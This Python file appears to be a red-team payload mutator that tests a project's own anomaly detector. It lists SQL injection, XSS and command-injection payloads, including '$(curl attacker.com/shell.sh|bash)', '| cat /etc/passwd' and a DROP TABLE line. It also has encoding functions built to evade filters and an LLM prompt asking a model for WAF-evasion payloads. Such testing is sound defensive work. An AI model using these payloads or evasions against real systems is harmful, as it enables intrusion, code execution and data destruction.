"""
CYPHEX — Mutation Engine (Red Team Payload Mutator)

Takes blocked payloads and generates mutated variants using:
1. Pure string manipulation (fast, no LLM needed)
2. LLM-powered adaptive mutation (when available)

Simulates how FraudGPT/WormGPT generates polymorphic attacks.
"""

import json
import re
import random
import asyncio
from urllib.parse import quote, unquote
from typing import Optional

import httpx

from config import config


class MutationEngine:
    """
    Red Team Mutator — generates evolved payloads that try to bypass the genome.
    Has two modes:
    - Fast mode: pure string manipulation (no LLM, <1ms per mutation)
    - Smart mode: LLM generates context-aware mutations
    """

    # ─── Base Attack Payloads ───
    SQLI_BASES = [
        "' OR 1=1--",
        "' UNION SELECT NULL,NULL,NULL--",
        "1' AND SLEEP(5)--",
        "admin'--",
        "' OR ''='",
        "1; DROP TABLE users--",
        "' UNION SELECT username,password FROM users--",
        "1' ORDER BY 10--",
        "' AND 1=CONVERT(int,(SELECT @@version))--",
        "' OR 1=1 LIMIT 1 OFFSET 1--",
    ]

    XSS_BASES = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "javascript:alert(1)",
        "<body onload=alert(1)>",
        "\"><script>alert(1)</script>",
        "'-alert(1)-'",
        "<details open ontoggle=alert(1)>",
        "<input onfocus=alert(1) autofocus>",
        "<marquee onstart=alert(1)>",
    ]

    CMDI_BASES = [
        "; ls -la",
        "| cat /etc/passwd",
        "$(whoami)",
        "`id`",
        "& net user",
        "|| dir c:\\",
        "; ping -c 1 attacker.com",
        "$(curl attacker.com/shell.sh|bash)",
    ]

    # ─── Obfuscation Techniques ───

    def url_encode(self, payload: str) -> str:
        """Standard URL encoding: ' → %27"""
        return quote(payload, safe="")

    def double_url_encode(self, payload: str) -> str:
        """Double encoding: ' → %2527"""
        return quote(quote(payload, safe=""), safe="")

    def unicode_escape(self, payload: str) -> str:
        """Unicode substitution for key characters."""
        replacements = {
            "'": "\\u0027", '"': "\\u0022", "<": "\\u003c", ">": "\\u003e",
            "/": "\\u002f", "=": "\\u003d", "(": "\\u0028", ")": "\\u0029",
        }
        result = payload
        for char, uni in replacements.items():
            result = result.replace(char, uni)
        return result

    def hex_encode(self, payload: str) -> str:
        """Hex encoding for SQL: 'admin' → 0x61646d696e"""
        # Only encode quoted strings
        def hex_replace(match):
            text = match.group(1)
            hex_str = text.encode().hex()
            return f"0x{hex_str}"
        return re.sub(r"'([^']*)'", hex_replace, payload)

    def comment_injection(self, payload: str) -> str:
        """Insert SQL comments between keywords: OR → O/**/R"""
        keywords = ['SELECT', 'UNION', 'INSERT', 'UPDATE', 'DELETE',
                     'DROP', 'FROM', 'WHERE', 'AND', 'OR', 'ORDER']
        result = payload
        for kw in keywords:
            if kw.lower() in result.lower():
                # Find the keyword case-insensitively and inject comments
                pattern = re.compile(re.escape(kw), re.IGNORECASE)
                match = pattern.search(result)
                if match:
                    original = match.group()
                    if len(original) > 2:
                        mid = len(original) // 2
                        obfuscated = original[:mid] + "/**/" + original[mid:]
                        result = result[:match.start()] + obfuscated + result[match.end():]
        return result

    def case_mutation(self, payload: str) -> str:
        """Random case changes: or → oR, Or, OR"""
        return ''.join(
            c.upper() if random.random() > 0.5 else c.lower()
            for c in payload
        )

    def whitespace_substitution(self, payload: str) -> str:
        """Replace spaces with alternative whitespace: space → %09 (tab)"""
        alternatives = ['%09', '%0a', '%0d', '%0b', '%0c', '+', '/**/']
        return payload.replace(' ', random.choice(alternatives))

    def concat_split(self, payload: str) -> str:
        """Split strings: 'admin' → CONCAT('ad','min')"""
        def split_string(match):
            text = match.group(1)
            if len(text) > 2:
                mid = len(text) // 2
                return f"CONCAT('{text[:mid]}','{text[mid:]}')"
            return match.group(0)
        return re.sub(r"'([^']+)'", split_string, payload)

    def char_function(self, payload: str) -> str:
        """Convert chars to CHAR() calls: 'a' → CHAR(97)"""
        def to_char(match):
            text = match.group(1)
            chars = ','.join(f"CHAR({ord(c)})" for c in text)
            return f"CONCAT({chars})"
        return re.sub(r"'([^']{1,5})'", to_char, payload)

    # ─── Main Mutation Methods ───

    def generate_variants(
        self, base_payload: str, count: int = 10, attack_type: str = "sqli"
    ) -> list[dict]:
        """
        Generate obfuscated variants of a single payload.
        Pure string manipulation — fast, no LLM needed.
        """
        techniques = [
            ("url_encode", self.url_encode),
            ("double_url_encode", self.double_url_encode),
            ("unicode_escape", self.unicode_escape),
            ("comment_injection", self.comment_injection),
            ("case_mutation", self.case_mutation),
            ("whitespace_sub", self.whitespace_substitution),
            ("concat_split", self.concat_split),
            ("char_function", self.char_function),
        ]

        if attack_type == "xss":
            # XSS-specific: skip SQL-only techniques
            techniques = [t for t in techniques if t[0] not in ("concat_split", "char_function", "comment_injection")]
            techniques.append(("hex_encode_xss", lambda p: p.replace("<", "&#60;").replace(">", "&#62;")))

        variants = []
        for i in range(min(count, len(techniques) * 3)):
            tech_name, tech_func = random.choice(techniques)
            try:
                mutated = tech_func(base_payload)
                if mutated != base_payload:  # Only add if actually changed
                    variants.append({
                        "payload": mutated,
                        "technique": tech_name,
                        "base": base_payload[:50],
                        "type": attack_type,
                    })
            except Exception:
                continue

        # Also combine multiple techniques
        for _ in range(min(count // 3, 5)):
            result = base_payload
            applied = []
            for _ in range(random.randint(2, 3)):
                tech_name, tech_func = random.choice(techniques)
                try:
                    result = tech_func(result)
                    applied.append(tech_name)
                except Exception:
                    continue
            if result != base_payload:
                variants.append({
                    "payload": result,
                    "technique": "+".join(applied),
                    "base": base_payload[:50],
                    "type": attack_type,
                })

        return variants[:count]

    def generate_initial_payloads(
        self, attack_type: str = "sqli", count: int = 20
    ) -> list[dict]:
        """
        Generate initial attack payloads for generation 0.
        Uses base payloads + mutations. No LLM needed.
        """
        bases = {
            "sqli": self.SQLI_BASES,
            "xss": self.XSS_BASES,
            "cmdi": self.CMDI_BASES,
        }.get(attack_type, self.SQLI_BASES)

        all_payloads = []

        # Add raw base payloads
        for base in bases:
            all_payloads.append({
                "payload": base,
                "technique": "raw",
                "base": base[:50],
                "type": attack_type,
            })

        # Generate variants of each base
        for base in bases:
            variants = self.generate_variants(base, count=3, attack_type=attack_type)
            all_payloads.extend(variants)

        random.shuffle(all_payloads)
        return all_payloads[:count]

    async def mutate_blocked_payloads(
        self, blocked: list[dict], genome_feedback: dict
    ) -> list[dict]:
        """
        Take payloads that were BLOCKED by genome and generate
        variants designed to evade the specific detection features.

        Uses genome_feedback to understand WHY they were blocked
        and applies targeted mutations.
        """
        new_payloads = []

        # Analyze what features triggered detection
        triggered_features = genome_feedback.get("features_triggered", [])

        for item in blocked[:10]:
            payload = item.get("payload", "")
            if not payload:
                continue

            # Apply targeted evasion based on what was detected
            if "entropy" in str(triggered_features):
                # Lower entropy by adding normal-looking padding
                padded = f"search={payload}&page=1&lang=en"
                new_payloads.append({
                    "payload": padded,
                    "technique": "entropy_padding",
                    "type": item.get("type", "sqli"),
                })

            if "keyword" in str(triggered_features):
                # Obfuscate keywords
                obfuscated = self.comment_injection(self.case_mutation(payload))
                new_payloads.append({
                    "payload": obfuscated,
                    "technique": "keyword_obfuscation",
                    "type": item.get("type", "sqli"),
                })

            if "special_char" in str(triggered_features):
                # Use URL encoding to hide special chars
                encoded = self.url_encode(payload)
                new_payloads.append({
                    "payload": encoded,
                    "technique": "special_char_encoding",
                    "type": item.get("type", "sqli"),
                })

            # Always generate a few random mutations too
            variants = self.generate_variants(payload, count=2, attack_type=item.get("type", "sqli"))
            new_payloads.extend(variants)

        return new_payloads

    async def mutate_with_llm(
        self, blocked_payloads: list[dict], genome_feedback: dict
    ) -> list[dict]:
        """
        LLM-powered mutation — asks the AI to generate evasion payloads.
        Only used when LLM is available. Falls back to string mutations.
        """
        system_prompt = """You are a cybersecurity researcher testing WAF evasion.
Generate obfuscated variants of blocked payloads that evade anomaly detection.
The detection system flagged these features: high entropy, SQL keywords, special characters.

Return ONLY a JSON array of objects with "payload" and "technique" fields.
Do NOT include explanations outside the JSON."""

        blocked_summary = "\n".join(
            f"- Blocked: {p.get('payload', '')[:80]} (reason: score {p.get('anomaly_score', 'N/A')})"
            for p in blocked_payloads[:5]
        )

        user_prompt = f"""These payloads were blocked by the behavioral genome:

{blocked_summary}

Detection feedback: {json.dumps(genome_feedback)}

Generate 5 new payloads that would evade this detection by:
1. Lowering entropy (look more like normal text)
2. Avoiding SQL/JS keyword detection
3. Using novel encoding techniques
4. Splitting payloads across parameters

Format: [{{"payload": "...", "technique": "..."}}]"""

        try:
            async with httpx.AsyncClient(timeout=60.0) as client:
                if config.AI_BACKEND_MODE == "local":
                    response = await client.post(
                        f"{config.OLLAMA_URL}/api/chat",
                        json={
                            "model": config.OLLAMA_MODEL,
                            "messages": [
                                {"role": "system", "content": system_prompt},
                                {"role": "user", "content": user_prompt},
                            ],
                            "stream": False,
                        },
                    )
                    if response.status_code == 200:
                        content = response.json().get("message", {}).get("content", "")
                        return self._parse_llm_payloads(content)
                elif config.AI_BACKEND_MODE == "groq" and config.GROQ_API_KEY:
                    response = await client.post(
                        config.GROQ_API_URL,
                        headers={
                            "Authorization": f"Bearer {config.GROQ_API_KEY}",
                            "Content-Type": "application/json",
                        },
                        json={
                            "model": config.GROQ_MODEL,
                            "max_tokens": 2048,
                            "messages": [
                                {"role": "system", "content": system_prompt},
                                {"role": "user", "content": user_prompt},
                            ],
                        },
                    )
                    if response.status_code == 200:
                        content = response.json().get("choices", [{}])[0].get("message", {}).get("content", "")
                        return self._parse_llm_payloads(content)
        except Exception:
            pass

        # Fallback to string mutations
        return await self.mutate_blocked_payloads(blocked_payloads, genome_feedback)

    def _parse_llm_payloads(self, text: str) -> list[dict]:
        """Parse LLM response into payload list."""
        import json as json_mod
        try:
            # Try to find JSON array in response
            match = re.search(r'\[[\s\S]*\]', text)
            if match:
                items = json_mod.loads(match.group())
                return [
                    {"payload": item.get("payload", ""), "technique": item.get("technique", "llm"), "type": "sqli"}
                    for item in items
                    if isinstance(item, dict) and item.get("payload")
                ]
        except (json_mod.JSONDecodeError, AttributeError):
            pass
        return []
